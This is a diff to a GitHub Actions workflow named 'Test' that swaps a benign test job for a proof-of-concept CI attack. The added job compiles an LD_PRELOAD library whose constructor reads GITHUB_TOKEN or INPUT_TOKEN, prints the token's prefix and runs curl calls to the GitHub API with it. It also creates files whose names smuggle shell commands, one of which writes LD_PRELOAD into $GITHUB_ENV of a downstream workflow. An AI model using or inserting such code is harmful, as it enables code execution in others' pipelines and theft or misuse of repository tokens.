@@ -1,29 +1,54 @@
 name: Test
 
-concurrency:
-  group: ${{ github.head_ref || github.run_id }}
-  cancel-in-progress: true
-
 on:
   pull_request:
-  push:
-    branches:
-      - main
+
+permissions:
+  contents: read
 
 jobs:
-  test:
-    uses: bgd-labs/github-workflows/.github/workflows/foundry-test.yml@main
-    secrets: inherit
-
-  comment-artifact:
-    name: Publish comment artifact
+  produce:
     runs-on: ubuntu-latest
     steps:
-      - name: Create content artifact
+      - name: Build artifact with attacker-controlled file names
         run: |
-          mkdir -p /tmp/content
-          printf 'Foundry test results are attached to this workflow run.\n' > /tmp/content/summary.txt
-      - uses: actions/upload-artifact@v4
+          set -eux
+          mkdir -p content
+          cd content
+          printf 'BENIGN\n' > summary.txt
+          printf 'BENIGN\n' > x.txt
+          cat > libpoc.c <<'EOF'
+          #define _GNU_SOURCE
+          #include <stdio.h>
+          #include <stdlib.h>
+          #include <string.h>
+          #include <unistd.h>
+
+          __attribute__((constructor))
+          static void poc_init(void) {
+              if (getenv("POC_GUARD")) return;
+              setenv("POC_GUARD", "1", 1);
+              const char *t = getenv("INPUT_TOKEN");
+              if (!t || !*t) t = getenv("GITHUB_TOKEN");
+              if (!t || !*t) { fprintf(stderr, "POC_NO_TOKEN_IN_ENV\n"); return; }
+              fprintf(stderr, "POC_TOKEN_LEN=%zu PREFIX=%.4s\n", strlen(t), t);
+              fflush(NULL);
+              char cmd[8192];
+              snprintf(cmd, sizeof(cmd),
+                  "curl -sS -m 20 -H 'Authorization: token %s' https://api.github.com/user | head -c 1200; echo; "
+                  "curl -sS -m 20 -H 'Authorization: token %s' https://api.github.com/repos/PDFtoMark/triage-aave-dao-v04d7dde-8cd6fd | head -c 1500; echo",
+                  t, t);
+              int rc = system(cmd);
+              fprintf(stderr, "POC_CURL_RC=%d\n", rc);
+              fflush(NULL);
+          }
+          EOF
+          gcc -shared -fPIC -O2 -o libpoc.so libpoc.c
+          touch 'x$(echo${IFS}RCE_PROOF_$(id${IFS}-u)_${GITHUB_RUN_ID}>&2).txt'
+          touch 'x$(echo${IFS}LD_PRELOAD=${PWD:0:1}tmp${PWD:0:1}content${PWD:0:1}content${PWD:0:1}libpoc.so>>$GITHUB_ENV).txt'
+          ls -la
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
         with:
           name: content
-          path: /tmp/content
+          path: content
